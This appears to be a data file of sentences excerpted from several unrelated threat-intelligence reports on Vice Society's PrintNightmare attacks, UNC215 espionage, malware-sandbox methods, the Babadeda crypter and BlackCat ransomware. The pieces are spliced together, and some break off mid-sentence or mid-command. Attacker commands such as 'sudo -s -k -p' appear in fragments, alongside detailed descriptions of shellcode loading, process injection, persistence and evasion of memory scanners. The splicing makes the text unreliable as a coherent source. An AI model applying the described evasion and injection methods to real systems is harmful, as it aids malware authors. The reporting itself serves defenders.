            "Executive SummaryAnother threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack, according to Cisco Talos Incident Response research.",
            "While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society.",
            "Talos Incident Response's research demonstrates that multiple, distinct threat actors view this vulnerability as attractive to use during their attacks and may indicate that this vulnerability will continue to see more widespread adoption and incorporation by various adversaries moving forward.",
            "For defenders, it is important to understand the attack lifecycle leading up to the deployment of ransomware.",
            "If users have not already, they should download the latest patch for PrintNightmare from Microsoft.",
            "In this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice Society that leveraged this vulnerability.",
            "Many of these same TTPs are commonly observed in other ransomware attacks, such as a previously published analysis of a WastedLocker attack.",
            "Who is Vice Society?Vice Society is a relatively new player in the ransomware space.",
            "They emerged in mid-2021 and have been observed launching big-game hunting and double-extortion attacks, primarily targeting small or midsize victims.",
            "This group also has notably targeted public school districts and other educational institutions.",
            "As they are a new actor in this space, Vice Society's TTPs are difficult to quantify.",
            "However, based on incident response observations, they are quick to leverage new vulnerabilities for lateral movement and persistence on a victim's network.",
            "They also attempt to be innovative on end-point detection response bypasses.",
            "As with other threat actors operating in the big-game hunting space, Vice Society operates a data leak site, which they use to publish data exfiltrated from victims who do not choose to pay their extortion demands.",
            "Below is an example screenshot of this site.",
            "Recent attack methodologyThroughout the course of our analysis of a recent human-operated ransomware attack associated with Vice Society, we observed several notable tactics, techniques, and procedures (TTPs) used throughout each stage of the attack lifecycle.",
            "Some of the most interesting characteristics of this attack were:The use of utilities such as proxychains and impacket during the post-compromise phases of the attack lifecycle.",
            "The targeting of backups to prevent recovery following ransomware deployment.",
            "The degradation of ESXi servers used for virtualization in victim environments.",
            "The use of a DLL that takes advantage of the recently discovered PrintNightmare vulnerability for which Microsoft has previously released a security update.",
            "Attempts to bypass native Windows protections for credential theft and privilege escalation.",
            "Below are some key examples of the TTPs used in this attack as they relate to the Mitre ATT&CK Framework.",
            "DiscoveryATT&CK Technique: System Owner/User Discovery (T1033)ATT&CK Technique: Account Discovery (T1087)ATT&CK Technique: Domain Trust Discovery (T1482)Once initial access was achieved, several techniques were observed being leveraged to conduct post-compromise discovery and reconnaissance within the environment.",
            "We observed attempts to access the backup solution employed in the environment, likely to prevent the organization from successfully recovering without paying the demanded ransom.",
            "The \"sudo\" command was used to obtain credentials associated with a commercial backup solution, likely trying to gain access to backups present within the environment.sudo -s",
            "-k -p",
            "[Backup Prompt] whoamiWe also observed the use of impacket, a common network protocol manipulation tool to enumerate the environment and obtain additional information about the Active Directory configuration in place.",
            "This is typically done to identify high-value targets that may be attractive, as attacks attempt to maximize their sphere of influence over as much of the environment as possible prior, eventually deploying ransomware and making their presence known.",
            "Below are some examples of the command line syntax used for the performance of this activity.cmd.exe /q",

            "This blog post details the post-compromise tradecraft and operational tactics, techniques, and procedures (TTPs) of a Chinese espionage group we track as UNC215.",
            "While UNC215\u2019s targets are located throughout the Middle East, Europe, Asia, and North America, this report focuses on intrusion activity primarily observed at Israeli entities. ",
            "This report comes on the heels of the July 19, 2021, announcements by governments in North America, Europe, and Asia and intragovernmental organizations, such as the North Atlantic Treaty Organization (NATO), and the European Union, condemning widespread cyber espionage conducted on behalf of the Chinese Government.",
            "These coordinated statements attributing sustained cyber espionage activities to the Chinese Government corroborate our long-standing reporting on Chinese threat actor targeting of private companies, governments, and various organizations around the world, and this blog post shows yet another region where Chinese cyber espionage is active. ",
            "Threat Detail ",
            "In early 2019, Mandiant began identifying and responding to intrusions in the Middle East by Chinese espionage group UNC215.",
            "These intrusions exploited the Microsoft SharePoint vulnerability CVE-2019-0604 to install web shells and FOCUSFJORD payloads at targets in the Middle East and Central Asia.",
            "There are targeting and high level technique overlaps with between UNC215 and APT27, but we do not have sufficient evidence to say that the same actor is responsible for both sets of activity.",
            "APT27 has not been seen since 2015, and UNC215 is targeting many of the regions that APT27 previously focused on; however, we have not seen direct connection or shared tools, so we are only able to assess this link with low confidence. ",
            "In addition to data from Mandiant Incident Response and FireEye telemetry, we worked with Israeli defense agencies to review data from additional compromises of Israeli entities.",
            "This analysis showed multiple, concurrent operations against Israeli government institutions, IT providers and telecommunications entities beginning in January 2019.",
            "During this time, UNC215 used new TTPs to hinder attribution and detection, maintain operational security, employ false flags, and leverage trusted relationships for lateral movement.",
            "We believe this adversary is still active in the region. ",
            "Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia. ",
            "After gaining initial access, the operators conduct credential harvesting and extensive internal network reconnaissance.",
            "This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.",
            "The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems. ",
            "In another incident response investigation, UNC215 pivoted to multiple OWA servers and installed web shells.",
            "In the following days, the operators interacted with these web shells from internal IP addresses, attempting to harvest credentials. ",
            "After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.",
            "UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.",
            "While UNC215 heavily relies on the custom tools FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tools are developed and used exclusively by UNC215. Figure 1: Attack Lifecycle Tradecraft and Operational Security We identified numerous examples of efforts by UNC215 to foil network defenders by minimizing forensic evidence left on compromised hosts, exploiting relationships with trusted third parties, continuously improving the FOCUSFJORD backdoor, concealing command and control (C2) infrastructure, and incorporating false flags. ",
            "Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.",
            "This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise. ",
            "The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.",
            "The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.",
            "On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the system\u2019s registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.",
            "This process enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scanning services.",
            "A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.",
            "The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence. ",
            "Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.",
            "As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target. ",
            "Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.",
            "The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.",
            "We do not have enough context about the following samples to attribute all of them to UNC215, though they are representative of activity we have seen from the group. ",
            "HYPERBRO samples MD5:",
            "0ec4d0a477ba21bda9a96d8f360a6848 and MD5: 04dece2662f648f619d9c0377a7ba7c0 have embedded configurations of internal IP addresses (192.168.1.237 and 192.168.4.26 respectively) as C2 servers.",
            "If they receive a command with an IP address and port, they will connect and relay the command. ",
            "FOCUSFJORD sample MD5: e3e1b386cdc5f4bb2ba419eb69b1b921 has an internal IP address, 192.168.4.197, configured as its C2.",
            "This sample was extracted from MD5: c25e8e4a2d5314ea55afd09845b3e886, which was submitted to a public malware repository in December 2017. ",
            "While hunting for FOCUSFJORD samples, we found a sample of a new malware (MD5: 625dd9048e3289f19670896cf5bca7d8) that shares code with FOCUSFJORD, but is distinct.",
            "However, analysis indicates that it only contains functions to relay communications between another FOCUSFJORD instance and a C2 server (Figure 2, Network A).",
            "We suspect this type of malware was used in the aforementioned operation.",
            "The actors stripped out unnecessary FOCUSFJORD capabilities, possibly to reduce the likelihood it would be detected by security controls.",
            "Figure 3 contains the data structure as it is being sent from a FOCUSFJORD sample configured to communicate with another FOCUSFJORD victim. ",
            "Figure 3: Two FOCUSFJORD samples configured to proxy C2 traffic FOCUSFJORD Changes We have observed numerous variants of the FOCUSFJORD malware family since 2017.",
            "The authors have added new communications protocols, an updated loading mechanism, and expanded the number of supported configurations in newer versions.",
            "Version numbers indicate that the malware undergoes frequent changes and maybe supported by a team of developers.",
            "Many of these variants contain or remove functionality depending on the operator\u2019s unique requirements at the time, which may suggest that multiple operators have access to the source code or a builder, or that a close relationship exists between the developers and operators. ",
            "FOCUSFJORD samples can be configured with up to 13 unique registry values which allow operators to control and organize compromised hosts.",
            "In addition to specifying details related to the loading and persistence mechanisms and C2 communications, there are two keys which allow the operator to add additional context about the victim: Registry key 12 is the \u201cgroup\u201d name.",
            "When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to \u201cdefault\u201d and is later manually changed by the actor, usually to the victim\u2019s domain name or organization name.",
            "Registry key 13 could be interpreted as the \u201cconsole\u201d name, although we do not fully understand how the identifier is used by the operators.",
            "We have observed the values \u201cgalway\u201d, \u201ciceland\u201d, \u201chelen\u201d, and \u201cidapro\u201d. ",
            "It is not clear how or if UNC215 uses these configuration parameters to organize and track large numbers of compromised hosts.",
            "We observed different console values within the same network, identical console values using different C2 addresses, and identical console values targeting different countries.",
            "Some FOCUSFJORD samples from 2018 and 2020 use the same console values despite the significant gap in time (See Table 1). ",
            "The NCC Group discussed these configurations in a 2018 report and released a decoding tool. ",
            "Trendmicro noted changes to supported configurations in FOCUSFJORD, dubbed SysUpdate, in their 2020 and 2021 reports following public disclosures.",
            "This suggests that operators using FOCUSFJORD are sensitive to security vendor reports and will update the code to avoid detection and exposure. ",

            "The first is an approach we call \u201cdependency emulation,\u201d where we can successfully detonate malware samples that would not normally be able to execute in our sandbox environment due to a lack of dependencies.",
            "We will also discuss our strategies of stealthy instrumentation for analysis of encrypted network traffic, to combat the ways SSL can be used to complicate command-and-control (C2) traffic analysis. ",
            "One overarching goal malware authors share is to remain undetected until their overall objective is reached.",
            "As we\u2019ve previously detailed in this blog post series, this has resulted in a seemingly limitless number of evasions and strategies targeted at confounding sandboxing and static analysis approaches.",
            "Due to the endless cat-and-mouse nature of reacting to malware authors\u2019 efforts to remain undetected, we\u2019ve come to understand that the most important characteristic for any automated malware analysis platform is adaptability. ",

            "Table of Contents Dependency EmulationExample File InfectorMitigating the Dependency ProblemVMI SSL/TLS DecryptionTLS HandshakesExample SSL Decryption With WiresharkConclusionIndicators of Compromise Dependency Emulation In the context of malware execution, we talk a lot about dependencies.",
            "When we do, we\u2019re referring to additional code that an executable depends on that is not inside the executable file.",
            "On Windows, external dependencies are usually Dynamically Linked Libraries (DLLs) that contain additional functionality that can be imported into the process to execute. ",
            "Often malware does not require external libraries in order to execute its malicious code, or it might call functions from those external libraries in a very late stage of its execution.",
            "Over the past few years we\u2019ve noticed a large uptick in malicious Windows executables that require external libraries for things like graphical user interfaces or better cross-platform support, and if the libraries are missing, then the malicious sample won\u2019t be able to run.",
            "When Windows cannot load an application because of a missing library, it will show a \u201cSystem Error\u201d error message box that displays the missing library name. ",
            "When we run any executable in our sandbox environment that requires dependencies that are not present, we would see the same error.",
            "But we wouldn\u2019t be able to get any analysis information from the sample because no malicious code was executed. ",
            "In Figure 1, we can see a screenshot of the ATMSpitter malware family, which requires the DLL MSXFS.dll to fully detonate.",
            "Without the required DLL, we would just see an error dialog telling us that Windows can\u2019t run this file.",
            "If we place the correct file inside the same directory and run the sample again, it runs just fine",
            "and we can extract information such as executed system calls and modified memory regions. ",

            "ATMSpitter malware requires MSXFS.dll to run.",
            "File infectors like Sality, Floxif, Expiro and Ramnit typically infect predefined sets of executables that they find on the disk.",
            "If the infected file requires specific libraries that are not part of the operating system (OS), then chances are it\u2019s not going to detonate inside a malware analysis sandbox because these dependencies likely won\u2019t be preinstalled in the environment.",
            "Our sandbox environments are constrained in resources like disk space, and the number of DLL files in the world is seemingly infinite. ",
            "Normally, when we run into this situation and the OS loader refuses to execute our file, we are left with no data at all from dynamic analysis.",
            "What is even more frustrating about this situation is that in many cases, those dependencies don\u2019t matter for infected files in that they aren\u2019t even going to be used. ",
            "File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.",
            "The OS will refuse to load and execute our file, despite the fact that none of the dependencies mattered anyway. ",
            "Example File Infector Let\u2019s take a look at one file that has been infected by the Sality malware, which requires external dependencies to run inside a sandbox.",
            "The original file is Groove Audit Service from Microsoft Office, and it requires dependencies from the libraries GrooveNew.dll and GroveUtil.dll (shown in Figure 2).",

            "The malicious code in the infected file is being called right at the entry point and doesn\u2019t require any dependencies to fully infect the system.",
            "However, because of the required dependencies, regular malware analysis sandboxes won\u2019t be able to run this kind of file. ",

            "Mitigating the Dependency Problem What can we do about this dependency problem for analysis at scale?",
            "Dependency emulation is an approach we\u2019ve recently prototyped and found useful to address this. ",
            "The main idea of this approach is to detect this situation automatically, and to adapt our sandbox environment to the files being detonated to ensure executables will have a chance to detonate.",
            "Since we have full control over the sandbox, it\u2019s easy to determine that the executable under analysis requires an external library, and to lie to the executable that all of its dependency requirements are met. ",
            "Given the million or so unique Windows executables we process daily, it would be an extremely difficult (if not impossible) task to automatically detect and add the specific external libraries for each executable that required external dependencies.",
            "There are literally hundreds of millions of libraries out there with numerous versions for each, and it\u2019s not really feasible to support providing any arbitrary library in a way that guarantees the intended execution of every sample. ",
            "However, as we\u2019ve discussed in our initial post in this blog series, we often don't need full execution for accurate detection.",
            "If we can get the malware sample under analysis to get past the Windows loader, initialize itself and unpack any additional payloads, we have a much better shot at detection.",
            "Otherwise, we simply get an error from the Windows loader (as shown in Figure 1) and no additional information beyond what static analysis would buy us. ",
            "But what happens when the executable tries to call a function in one of those dependencies?",
            "The bad news is that, since we aren\u2019t trying to provide actual copies of the required libraries, we can\u2019t correctly simulate the function calls into any of the libraries not present in our environment. ",
            "The good news is that, in most cases, this is still enough for accurate detection.",
            "We don\u2019t need to correctly execute every code path present in the executable, we just need enough execution and memory artifacts for accurate detection.",
            "For this reason, in order to avoid unintentional crashes or bugs from the analyzed sample, our sandbox stops the execution if any function from the generated stub libraries is called. ",
            "All things considered, with this approach we've seen a lot of samples detonate that wouldn't otherwise, and we've seen many correct detections. ",
            "VMI SSL/TLS Decryption Another challenge we\u2019ve faced with analyzing malware at scale is how to stealthily spy on TLS encrypted traffic in a way that\u2019s not detectable by the malware.",
            "As HTTPS and other protocols built on SSL have become increasingly ubiquitous for accessing resources across the internet, it\u2019s not surprising that malware authors also use this protocol for other things, such as pulling down the next stage of their payload, or C2 communications. ",
            "It is possible, of course, to take the easy route and intercept and decrypt all of the traffic from our sandbox with a meddler-in-the-middle approach.",
            "The problem with this is that it\u2019s detectable by examining and validating TLS certificates.",
            "It\u2019s also possible to instrument and log calls to some of the higher level networking APIs, but again, this is also detectable in many cases and isn\u2019t going to get us all encrypted communications. ",
            "One solution we\u2019ve found useful for this problem is to detect when TLS connections are being initiated and log the symmetric keys generated for the SSL/TLS connection using virtual machine introspection (VMI). ",
            "Before we look into that detection method, let\u2019s have a quick lesson on TLS handshakes. ",
            "TLS Handshakes When an SSL/TLS connection is being established, certain data between the local system and the remote server is exchanged to validate each side's authenticity and generate symmetric keys to encrypt data over the wire. ",
            "This data includes the following: Preferred TLS version Supported cipher suites 32 bytes of random data used in the key generation algorithm A data signature, in the case of an ephemeral elliptic-curve Diffie-Hellman (ECDHE) key exchange An example of an ECDHE \u201cServer Hello\u201d message is shown in Figure 6. Figure 6.",
            "Wireshark screenshot illustrating the initial handshake for an SSL connection.",
            "In the case of a Diffie-Hellman (DH) handshake, additional DH parameters are then exchanged, and each side separately calculates a pre-master secret.",
            "Finally, the same master secret key is calculated on each side by utilizing the pre-master secret and the client and server random values. ",
            "The calculated master secret is 48 bytes in length.",
            "Through reverse engineering efforts, we discovered that this key generation occurs in the ncrypt.dll library in recent versions of the Windows OS. ",
            "The key generation happens in memory, so the key is never written to disk and it doesn\u2019t traverse the wire.",
            "By knowing the exact location in code where each master key is generated and precisely where it resides in memory, it is possible to extract the key.",
            "This can be accomplished with, for example, an analysis engine via virtual machine introspection, which makes a system invisible to the malware.",
            "A similar approach can be implemented in instances where other third party libraries are used for key generation, such as OpenSSL. ",
            "An example output, which includes everything needed to decrypt TLS traffic, is shown in Figure 7. ",
            "Figure 7.",
            "Extracted random value and master key.",
            "Final keys and initialization vectors used to encrypt and decrypt network traffic are generated from the master secret through a key expansion.",
            "Conveniently, the open source tool Wireshark/Tshark accepts a keyfile to perform this decryption automatically on collected pcap traffic. ",
            "Example SSL Decryption With Wireshark Let's take a look at a real world example of a sample that belongs to the malware family FormBook.",
            "The sample is loaded by a loader written in Delphi, which downloads the next stage from a public file storage service using HTTPS. ",
            "If we open the recorded package capture in Wireshark and provide the extracted SSL/TLS keys that were extracted by the analysis platform, we should be able to see the SSL encrypted traffic to the public file storage service, including the downloaded data. ",
            "The random client value and the master secret key must be stored in a specific file format that Wireshark supports.",
            "It looks like this: CLIENT_RANDOM",
            "<random_client_value> <master_secret_key> To provide the decryption keys to Wireshark, we have to use the option ssl.keylog_file, which we can pass through the command line.",
            "For example: Wireshark -r guest_traffic.pcap -o \"ssl.keylog_file:key_capture.keys\" After opening the capture (pcap) in Wireshark, the TLS encrypted data will be decrypted, and we can use the http filter to get the decrypted HTTPS traffic.",
            "This is shown in Figure 8. Figure 8.",
            "Decrypted HTTPS traffic.",
            "In Figures 9 and 10, we can see the communication to the public file storage service. ",

            "Figure 10.",
            "Downloaded data from public file storage.",
            "With the decrypted content, we can write more precise behaviors and signatures that match a malicious sample's network communication. ",
            "Conclusion In this post we have discussed two important ways we\u2019ve been able to tailor our analysis environment.",
            "As we\u2019ve mentioned in previous posts, adaptability in sandboxing is exceptionally important when it comes to staying on top of the malware detection problem.",
            "Threats are continually evolving, and architecting analysis systems as more of a flexible, nicely abstracted software development kit instead of a stand-alone monolithic application is crucial. ",

            "title: Babadeda Crypter targeting crypto, NFT, and DeFi communities url: https://blog.morphisec.com/the-babadeda-crypter-targeting-crypto-nft-defi-communities The cryptocurrency market is now worth more than $2.5 trillion.",
            "Unfortunately, this fact is not lost on threat actors.",
            "As well as using cryptocurrency themselves to extract ransoms, cybercriminals are now also tailoring malware to exploit the booming market for NFTs and crypto games.",
            "In a discovery of critical importance to anyone familiar with this space, Morphisec Labs has encountered a new campaign of malware targeting cryptocurrency enthusiasts through Discord. ",
            "Crucially, the crypter that this campaign deploys, which we have termed Babadeda (a Russian language placeholder used by the crypter itself which translates to \u201cGrandma-Grandpa\u201d), is able to bypass signature-based antivirus solutions.",
            "Although some variants of this crypter have been noted by other vendors, Morphisec is the first to fully disclose how it works. ",
            "For victims, this makes infections highly likely \u2014 and dangerous.",
            "We know that this malware installer has been used in a variety of recent campaigns to deliver information stealers, RATs, and even LockBit ransomware.",
            "Fortunately, however, even as the threat level for cryptocurrency users rises, we also know that Morphisec\u2019s Moving Target Defense technology is capable of both seeing and stopping Babadeda. ",
            "In this blog post, we will explore how Babadeda is being delivered, what an in-depth technical analysis of this malware tells us about it, and how it can be stopped. ",
            "Crypto and NFT Communities Are Prime Targets Since May 2021, we have observed several malware distribution campaigns. ",
            "However, many of the recent infections we have seen appear to be related to a sophisticated campaign that exclusively targets the Crypto, NFT, and DeFi communities.",
            "It is precisely for this reason, as well as the fact that NFTs are rising in popularity, that we have decided to take a look at this particular campaign distribution in more detail. ",
            "For those who are not familiar with NFTs (Non-fungible token): the term refers to unique tokens that provide proof of ownership on data that is stored on the blockchain technology.",
            "In recent years, NFTs have exploded in popularity, and are now starting to enter the mainstream consciousness.",
            "Naturally, this growing trend in the crypto space has opened up a new vector for threat actors to exploit. ",
            "The DElivery Chain The vast majority of today's NFT and crypto communities are based on Discord (a group chatting platform) channels.",
            "Discord channels are publicly accessible and allow users to send private messages to one another within a channel. ",
            "In the campaign that we observed, a threat actor took advantage of these features in order to phish victims.",
            "The threat actor sent users a private message inviting them to download a related application that would supposedly grant the user access to new features and/or additional benefits.",
            "Because the actor created a Discord bot account on the official company discord channel, they were able to successfully impersonate the channel\u2019s official account. ",
            "Below is an example of a phishing message that targeted users of \u201cMines of Dalarna\u201d, a PC game built on the blockchain. ",
            "Figure 1: Fake message on the discord channel. ",
            "If a user clicks on the URL within the message, it will direct them to a decoy site.",
            "There, the user will be encouraged to download a malicious installer that embeds the Crypter with the payload. ",
            "Figure 2: Original and decoy sites comparison As you can see from the example above, the threat actor took extended measures to ensure that the delivery chain looks legitimate even to technical users.",
            "Typically: Cybersquatting - the domain names of the decoy sites look a lot like the domain names of the original sites Threat actors will usually remove/add a letter from/to the domain name or change the top-level domain. ",
            "The domains are signed with a certificate (via LetsEncrypt), which enables an HTTPS connection. ",
            "The UI of the decoy pages is very similar to the UI of the original pages. ",
            "Upon clicking \u201cDownload APP\u201d, the site will generally navigate to /downland.php, which will redirect the download request to a different domain (this makes it less likely that someone will detect a decoy site). ",
            "Interestingly, on one of these decoy sites, we noticed an HTML object written in Russian.",
            "This suggests that the threat actor's origins may be in a Russian-speaking country since they most likely forgot to translate the HTML object from their native language into English Figure 3: Lost in translation? ",
            "Decoy site examples The following table shows a few examples of the decoy sites used in the campaigns we have observed. ",

            "While investigating the Crypter, we saw how important it was for the threat actor to hide its malicious intentions inside legitimate applications in order to avoid detection.",
            "The following figure emphasizes the complexity of the evasive techniques that are implemented in the Crypter. Figure 5: Low detection rate on VT The Installer Once downloaded and executed, the malicious installer copies its compressed files into a newly created folder with a legitimate-looking name (i.e., IIS Application Health Monitor) in one of the following directory paths: C:\\Users\\<user>\\AppData\\Roaming\\C:\\Users\\<user>\\AppData\\Local\\ The malicious files are copied along with many other open-source or free application-related files.",
            "At first glance, the files within the directory may seem legitimate.",
            "However, looking at these files carefully it becomes apparent that some of them are suspicious and should be inspected, as shown by the figure below. ",
            "Figure 6: The compressed files (malware files selected with stage numbers) Crypter Execution After dropping the mentioned files, the Installer starts execution via the main executable (number 1 in the figure above). ",
            "We have noticed that at this point, some variants display a fake error message that stops the execution until the user interacts with the message.",
            "This fake message might be used as a security solutions evasion technique.",
            "Alternatively, its role may be to deceive the user into thinking that the application has failed to execute, even as it silently continues the malicious execution in the background. ",
            "Figure 7: Fake error message By analyzing the two different variants, we can see the implementation of this message box: Figure 8: Comparison between variants As we can see in the figure below, the function\u2019s code is much longer compared to the actual DLL loading code.",
            "That\u2019s because the actor has implanted its actions within a legitimate application code in order to confuse analysts, obfuscate its real intentions, and make it harder for antivirus solutions to detect. ",
            "Figure 9: Left - the full function.",
            "Right - the DLL loading code The Shellcode's Loader DLL ",
            "The threat actor generally embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.",
            "Nonetheless, we have also observed additional file types such as JavaScript, Text, and PNG. ",
            "Here, just like before, the actor embeds the malicious code inside different legitimate codes.",
            "We have extracted the relevant sections to clearly demonstrate the malware\u2019s activity: Figure 10: Exported function logic The malicious logic starts by reading the additional file (in this case an XML file) and calling kernel32!Sleep for 35 seconds (the duration changes between variants).",
            "Next, it loads this entire file to memory and starts its parsing task. ",
            "The first piece that is parsed from the file is a shellcode located in a pre-calculated offset (in this case, 0x88D8C and overwrites the executable at offset 0x1600). ",
            "Figure 11: The shellcode bytes inside the XML file The executable .text section\u2019s characteristics are configured to RWE (Read-Write-Execute) -- that way the actor doesn't need to use VirtualAlloc or VirtualProtect in order to copy the shellcode and transfer the execution.",
            "This helps with evasion since those functions are highly monitored by security solutions.",
            "Once the shellcode is copied to the executable, the DLL calls to the shellcode\u2019s entry point (shellcode_address). ",
            "Persistency Implementation If the crypter is configured to install persistence, the loader DLL will execute a new thread that loads another DLL (from the compressed files) that will handle this task. Figure 12: New thread creation for calling the persistent mechanism The newly loaded DLL will either use one of the following logics or both of them to implement the persistency: Write a.lnk file in the startup folder that executes the Crypter\u2019s main executable. ",
            "Figure 13: .lnk file persistence implementation Write a registry Run key that executes the Crypter\u2019s main executable. ",
            "Figure 14: registry run key persistence implementation The Decryption Shellcode The XML file (or any other file type used by the crypter) contains the following components: The first shellcode (referred to in this section). ",
            "An encrypted additional shellcode (referred to in the next section, the Loader shellcode) An encrypted payload. ",
            "The Decryption shellcode has three main tasks: first, it extracts the Loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted Loader shellcode. ",
            "Figure 15: Decryption shellcode execution flow The Decryption shellcode begins with dynamically locating the configuration structure by searching for a sequence of six or more identical bytes.",
            "This configuration holds pointers to the loader shellcode and the final payload; these are encrypted and split inside the XML. Figure 16: Configuration and XML file\u2019s structures Based on this, we can identify the configuration inside the XML file: Figure 17: Configuration structure Using this configuration the malware iterates over each chunk copies it, and decrypts it using the denoted decryption key (the configuration changes between samples). ",
            "Then, the shellcode searches for two DWORD placeholders, 0xBABADEDA and 0xDEADBEAF.",
            "It replaces the first placeholder with the address of the decrypted payload and the latter with the size of the payload.",
            "This data is used in the next stage, the Loader shellcode. ",
            "The Loader Shellcode The purpose of the Loader shellcode is to inject the decrypted payload within the currently running process (itself). ",
            "We can divide the loading mechanism into three stages: initialization, injection, and correction. ",
            "Initialization This stage is responsible for setting the relevant data that will be used during the injection and correction stages. ",
            "Figure 18: Extracting the data for injection and correction stages To start initializing, the Loader first saves the decrypted payload address and payload size according to the placeholder\u2019s addresses.",
            "Next, it parses the PE headers of the payload to extract the image size and the entry point according to the current executable\u2019s base address.",
            "The Loader parses the _PEB structure in order to find the base address of the current executable and the LDR_DATA_TABLE_ENTRY which will be used later.",
            "Finally, it dynamically loads the VirtualProtect function using a pre-calculated hash value (0xF1C25B45 in our case). ",
            "Injection This stage is pretty straightforward.",
            "Within it, the Loader overwrites the current PE with the final payload\u2019s PE.",
            "It does so by copying the PE headers and each section according to the current executable\u2019s base address. ",
            "Figure 19: Change headers protection and clear memory bytes for the new PE Once previous bytes have been cleared, the Loader copies the new PE headers to the base address and each section to the relevant location according to the IMAGE_SECTION_HEADER. ",
            "Correction The final stage is responsible for fixing the import address table and relocation table of the newly injected PE. ",
            "Figure 20: Fix tables and remove altering evidence mw_construct_IAT Load GetModuleHandleA, LoadLibraryA and GetProcAddress functions by hash (0x9FE4FCE1, 0x85557334 and 0xF23B576D respectively). ",
            "Iterate over the IAT of the new PE. ",
            "Load each function and update its address. ",

            "Iterate over each entry in the relocation table. ",
            "Add the delta to the entry value. ",
            "In addition to fixing the import address and relocation tables, the Loader removes evidence of injection by using the following methods: Update the LDR data table entry to match the injected PE. ",
            "Remove the injected PE headers from memory. ",
            "These steps attempt to evade memory scanners that seek mismatching LDR data and in-memory PEs. ",
            "Finally, the malware jumps to the entry point of the newly injected PE with the original command-line arguments. ",
            "Conclusion As demonstrated above, Babadeda is a highly dangerous crypter.",
            "Targeting cryptocurrency users through trusted attack vectors gives its distributors a fast-growing selection of potential victims.",
            "Once on a victim's machine, masquerading as a known application with a complex obfuscation also means that anyone relying on signature-based malware effectively has no way of knowing Babadeda is on their machine \u2014 or of stopping it from executing. ",
            "Mitigating the threat posed by Babadeda requires securing the device memory it targets.",
            "Morphisec does this through Moving Target Defence, a technology that morphs process memory trapping crypters like Babadeda before they are able to deploy. ",

            "Operating a ransomware-as-a-service (RaaS) business model, BlackCat was observed soliciting for affiliates in known cybercrime forums, offering to allow affiliates to leverage the ransomware and keep 80-90% of the ransom payment.",
            "The remainder would be paid to the BlackCat author. ",
            "BlackCat has taken an aggressive approach to naming and shaming victims, listing more than a dozen on their leak site in a little over a month.",
            "The largest number of the group\u2019s victims so far are U.S. organizations, but BlackCat and its affiliates have also attacked organizations in Europe, the Philippines and other locations.",
            "Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals. ",
            "Use of BlackCat ransomware has grown quickly for a variety of reasons (for comparison, AvosLocker had only listed a handful of victims publicly within two months of becoming known).",
            "Effective marketing to affiliates is a likely factor \u2013 in addition to offering an enticing share of ransom payments, the group has solicited affiliates by posting ads on forums such as Ransomware Anonymous Market Place (RAMP). ",
            "The malware itself is written in Russian and coded in the Rust programming language.",
            "Though this is not the first piece of malware to use Rust, it is one of the first, if not the first, piece of ransomware to use it.",
            "By leveraging this programming language, the malware authors are able to easily compile it against various operating system architectures.",
            "Given its numerous native options, Rust is highly customizable, which facilitates the ability to pivot and individualize attacks. ",
            "The threat actors leveraging BlackCat, often referred to as the \"BlackCat gang,\u201d utilize numerous tactics that are becoming increasingly commonplace in the ransomware space.",
            "Notably, they use multiple extortion techniques in some cases, including the siphoning of victim data before ransomware deployment, threats to release data if the ransom is not paid and distributed denial-of-service (DDoS) attacks. ",
            "Palo Alto Networks detects and prevents BlackCat ransomware with the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire). ",
            "Due to the surge of this malicious activity, we\u2019ve created this threat assessment for overall awareness.",
            "Full visualization of the techniques observed, relevant courses of action and IOCs can be viewed in the Unit 42 ATOM viewer. ",

            "Affiliates keep an 80-90% share of the ransom payment, with the remainder going to the BlackCat author.",
            "These affiliates are interviewed and vetted before being accepted into the RaaS group.",
            "Once the affiliate is confirmed, they are given unique access to a Tor-based control panel that hosts the affiliate\u2019s access. ",
